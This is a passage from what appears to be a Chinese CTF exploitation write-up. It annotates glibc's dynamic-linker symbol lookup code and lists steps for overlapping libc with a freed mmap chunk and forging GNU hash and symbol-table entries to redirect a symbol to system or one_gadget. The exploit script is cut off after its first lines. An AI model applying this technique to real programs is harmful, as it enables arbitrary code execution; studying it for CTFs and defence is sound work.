+</span></span><span class="line"><span class="cl">	  <span class="n">flags</span> <span class="o">|=</span> <span class="n">DL_LOOKUP_GSCOPE_LOCK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef RTLD_ENABLE_FOREIGN_CALL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="n">RTLD_ENABLE_FOREIGN_CALL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="c1">// 第一个参数是字符串地址，根据符号表和字符串表得到的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 第二个参数是link_map
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 第四个参数是scope，表示查找的范围
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 第五个参数是版本信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 后面的参数都是固定的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">result</span> <span class="o">=</span> <span class="nf">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* We are done with the global scope.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RTLD_SINGLE_THREAD_P</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">THREAD_GSCOPE_RESET_FLAG</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef RTLD_FINALIZE_FOREIGN_CALL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="n">RTLD_FINALIZE_FOREIGN_CALL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Currently result contains the base load address (or link map)
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 of the object that defines sym.  Now add in the symbol
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 offset.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="n">value</span> <span class="o">=</span> <span class="nf">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				   <span class="nf">SYMBOL_ADDRESS</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="nb">false</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* We already found the symbol.  The module (and therefore its load
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 address) is also known.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="n">value</span> <span class="o">=</span> <span class="nf">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="nf">SYMBOL_ADDRESS</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="nb">true</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="n">l</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* And now perhaps the relocation addend.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">value</span> <span class="o">=</span> <span class="nf">elf_machine_plt_value</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">sym</span> <span class="o">!=</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">__builtin_expect</span> <span class="p">(</span><span class="nf">ELFW</span><span class="p">(</span><span class="n">ST_TYPE</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">STT_GNU_IFUNC</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="nf">elf_ifunc_invoke</span> <span class="p">(</span><span class="nf">DL_FIXUP_VALUE_ADDR</span> <span class="p">(</span><span class="n">value</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Finally, fix up the plt itself.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">GLRO</span><span class="p">(</span><span class="n">dl_bind_not</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// 修正got表条目
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nf">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">refsym</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div><p>3.调用_dl_lookup_symbol_x 函数 在各个so的link_map寻找对应符号,但是实际调用do_lookup_x函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">Cstatic</span> <span class="kt">int</span>
+</span></span><span class="line"><span class="cl"><span class="n">__attribute_noinline__</span>
+</span></span><span class="line"><span class="cl"><span class="nf">do_lookup_x</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">undef_name</span><span class="p">,</span> <span class="kt">uint_fast32_t</span> <span class="n">new_hash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	     <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="o">*</span><span class="n">old_hash</span><span class="p">,</span> <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">ref</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	     <span class="k">struct</span> <span class="n">sym_val</span> <span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="k">struct</span> <span class="n">r_scope_elem</span> <span class="o">*</span><span class="n">scope</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">i</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	     <span class="k">const</span> <span class="k">struct</span> <span class="n">r_found_version</span> <span class="o">*</span><span class="k">const</span> <span class="n">version</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	     <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">skip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type_class</span><span class="p">,</span> <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">undef_map</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">scope</span><span class="o">-&gt;</span><span class="n">r_nlist</span><span class="p">;</span> <span class="c1">//r_nlist是动态库link_map的数量，每个动态库都有一个link_map
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="cm">/* Make sure we read the value before proceeding.  Otherwise we
+</span></span></span><span class="line"><span class="cl"><span class="cm">     might use r_list pointing to the initial scope and r_nlist being
+</span></span></span><span class="line"><span class="cl"><span class="cm">     the value after a resize.  That is the only path in dl-open.c not
+</span></span></span><span class="line"><span class="cl"><span class="cm">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">&#34;&#34;</span> <span class="o">:</span> <span class="s">&#34;+r&#34;</span> <span class="p">(</span><span class="n">n</span><span class="p">),</span> <span class="s">&#34;+m&#34;</span> <span class="p">(</span><span class="n">scope</span><span class="o">-&gt;</span><span class="n">r_list</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">link_map</span> <span class="o">**</span><span class="n">list</span> <span class="o">=</span> <span class="n">scope</span><span class="o">-&gt;</span><span class="n">r_list</span><span class="p">;</span><span class="c1">//存放每个link_map的地址数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">map</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">l_real</span><span class="p">;</span> <span class="c1">//l_real 是 struct link_map 结构体中的一个成员，通常指向该动态链接库实际对应的 link_map。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#39;.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">==</span> <span class="n">skip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Don&#39;t search the executable when resolving a copy reloc.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="n">type_class</span> <span class="o">&amp;</span> <span class="n">ELF_RTYPE_CLASS_COPY</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_type</span> <span class="o">==</span> <span class="n">lt_executable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Do not look into objects which are going to be removed.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_removed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Print some debugging info if wanted.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">GLRO</span><span class="p">(</span><span class="n">dl_debug_mask</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">DL_DEBUG_SYMBOLS</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">_dl_debug_printf</span> <span class="p">(</span><span class="s">&#34;symbol=%s;  lookup in file=%s [%lu]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			  <span class="n">undef_name</span><span class="p">,</span> <span class="nf">DSO_FILENAME</span> <span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_name</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			  <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_ns</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* If the hash table is empty there is nothing to do here.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_nbuckets</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">Elf_Symndx</span> <span class="n">symidx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">num_versions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">versioned_sym</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* The tables for this map.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 找到符号表和字符串表（当前link_map）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">symtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="nf">D_PTR</span> <span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="nf">D_PTR</span> <span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 获取bitmask
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="o">*</span><span class="n">bitmask</span> <span class="o">=</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_gnu_bitmask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_likely</span> <span class="p">(</span><span class="n">bitmask</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 获取bitmask_word，这里需要伪造，//bitmask_word用来判断new_hash是否哈希表中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// new_hash的计算：int_fast32_t new_hash = _dl_elf_hash (undef_name);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// undef_name 符号名称。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">bitmask_word</span>
+</span></span><span class="line"><span class="cl">	    <span class="o">=</span> <span class="n">bitmask</span><span class="p">[(</span><span class="n">new_hash</span> <span class="o">/</span> <span class="n">__ELF_NATIVE_CLASS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		      <span class="o">&amp;</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_gnu_bitmask_idxbits</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">hashbit1</span> <span class="o">=</span> <span class="n">new_hash</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">__ELF_NATIVE_CLASS</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">hashbit2</span> <span class="o">=</span> <span class="p">((</span><span class="n">new_hash</span> <span class="o">&gt;&gt;</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_gnu_shift</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				   <span class="o">&amp;</span> <span class="p">(</span><span class="n">__ELF_NATIVE_CLASS</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">((</span><span class="n">bitmask_word</span> <span class="o">&gt;&gt;</span> <span class="n">hashbit1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="o">&amp;</span> <span class="p">(</span><span class="n">bitmask_word</span> <span class="o">&gt;&gt;</span> <span class="n">hashbit2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取bucket，这里需要伪造
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 获取符号所在的桶（bucket）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// map-&gt;l_gnu_buckets 是 GNU 哈希表的桶数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// new_hash % map-&gt;l_nbuckets 计算出符号在桶数组中的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 将该索引对应的桶的值赋给 bucket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 这里代码注释提到需要伪造，可能是在某些特殊调试或模拟场景下的情况
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	      <span class="n">Elf32_Word</span> <span class="n">bucket</span> <span class="o">=</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_gnu_buckets</span><span class="p">[</span><span class="n">new_hash</span>
+</span></span><span class="line"><span class="cl">						     <span class="o">%</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">l_nbuckets</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	      <span class="k">if</span> <span class="p">(</span><span class="n">bucket</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// hasharr，这里也需要伪造对应的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// 这里注释提到 hasharr 需要伪造对应的值，可能是在某些特殊调试或模拟场景下的情况
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 从 GNU 哈希表的链数组中获取当前桶对应的起始位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// map-&gt;l_gnu_chain_zero 是 GNU 哈希表的链数组起始地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// bucket 是前面计算得到的符号所在的桶的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 通过 &amp;map-&gt;l_gnu_chain_zero[bucket] 获取该桶对应的链的起始指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		  <span class="k">const</span> <span class="n">Elf32_Word</span> <span class="o">*</span><span class="n">hasharr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_gnu_chain_zero</span><span class="p">[</span><span class="n">bucket</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// 使用 do-while 循环遍历当前桶对应的链，查找匹配的符号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">		    <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">hasharr</span> <span class="o">^</span> <span class="n">new_hash</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		      <span class="c1">// 根据当前链节点的信息计算符号在符号表中的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// ELF_MACHINE_HASH_SYMIDX 是一个宏，用于根据不同的 ELF 机器类型计算符号索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// map 是当前共享对象的 link_map 结构体指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// hasharr 是当前链节点的指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">symidx</span> <span class="o">=</span> <span class="nf">ELF_MACHINE_HASH_SYMIDX</span> <span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">hasharr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">// 调用 check_match 函数检查当前符号是否真正匹配要查找的符号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// undef_name 是要查找的未定义符号的名称
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// ref 是引用符号的符号表项指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// version 用于存储找到的符号的版本信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// flags 是查找标志，控制查找的行为
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// type_class 是符号类型类别
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &amp;symtab[symidx] 是当前可能匹配的符号在符号表中的项
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// symidx 是符号在符号表中的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// strtab 是字符串表指针，用于获取符号名称
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// map 是当前共享对象的 link_map 结构体指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &amp;versioned_sym 用于存储版本化符号的信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &amp;num_versions 用于存储版本数量信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">sym</span> <span class="o">=</span> <span class="nf">check_match</span> <span class="p">(</span><span class="n">undef_name</span><span class="p">,</span> <span class="n">ref</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="n">type_class</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">symidx</span><span class="p">],</span> <span class="n">symidx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="n">strtab</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">versioned_sym</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="o">&amp;</span><span class="n">num_versions</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">// 如果 check_match 函数返回非空指针，说明找到了匹配的符号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">sym</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// 跳转到 found_it 标签处，进行后续处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">goto</span> <span class="n">found_it</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// 移动到链中的下一个节点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// (*hasharr++ &amp; 1u) 用于检查当前链节点是否是链中的最后一个节点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// 如果最后一位为 0，则表示不是最后一个节点，继续循环查找
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		  <span class="k">while</span> <span class="p">((</span><span class="o">*</span><span class="n">hasharr</span><span class="o">++</span> <span class="o">&amp;</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">//....
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span></code></pre></div></li>
+</ol>
+
+
+<h4 class="relative group"> 
+    <div id="heading" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#heading" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+
+
+<h3 class="relative group">利用攻击 
+    <div id="%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+
+
+<h4 class="relative group">利用流程 
+    <div id="%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+<ol>
+<li>malloc &gt; 128k的内存</li>
+<li>修改该chunk的size，使其大到能覆盖掉libc的一些地址</li>
+<li>free该地址</li>
+<li>然后malloc 更大的内存</li>
+<li>计算当前chunk的地址到libc的地址距离 （调试得出，第一步malloc时，取libc的地址 - (第四步malloc的地址+0x10)）</li>
+<li>计算到布隆过滤器(bitmask)数组的偏移 （<code>.gnu.hash的地址  + 16</code>）</li>
+<li>计算到哈希桶(bucket)数组的偏移 ( <code>bloom 的偏移 + bloom_size * 8</code>)</li>
+<li>计算bitmask_word的在bitmask中index</li>
+<li>计算bitmask_word的地址</li>
+<li>获取bitmask_word的值</li>
+<li>计算目标符号在哈希桶中的index  (exit_hash % 桶数(nbucket))</li>
+<li>计算该bucket的地址</li>
+<li>获取buket的值，为目标符号在buket中的值。</li>
+<li>计算到<code>l_gnu_chain_zero</code>哈希链数组（GNU 哈希表的链数组起始地址）的距离</li>
+<li>计算到目标符号的符号表的偏移</li>
+<li>伪造符号表的数据结构，将st_value伪造成目标地址，如one_gadget,system的偏移地址。</li>
+</ol>
+<p>为什么不直接伪造st_value,在偷libc的地址的时候，偷到的内存会被清空，所以需要重新伪造。</p>
+
+
+<h5 class="relative group">某题：exp 
+    <div id="%E6%9F%90%E9%A2%98exp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%9F%90%E9%A2%98exp" aria-label="锚点">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
